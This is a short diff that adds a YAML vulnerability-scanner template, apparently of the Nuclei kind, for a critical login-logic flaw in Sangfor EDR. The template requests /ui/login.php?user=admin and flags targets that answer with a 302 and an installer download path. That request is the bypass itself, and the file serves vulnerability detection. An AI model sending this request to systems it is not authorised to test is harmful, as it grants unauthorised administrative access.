@@ -1,0 +1,22 @@
+id: yaml-poc-sangfor-edr-logical-CT-158513
+info:
+  name: Yaml Poc Sangfor Edr Logical Ct 158513
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-sangfor-edr-logical-CT-158513'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /ui/login.php?user=admin
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 302
+  - type: word
+    part: body
+    words:
+    - /download/edr_installer_
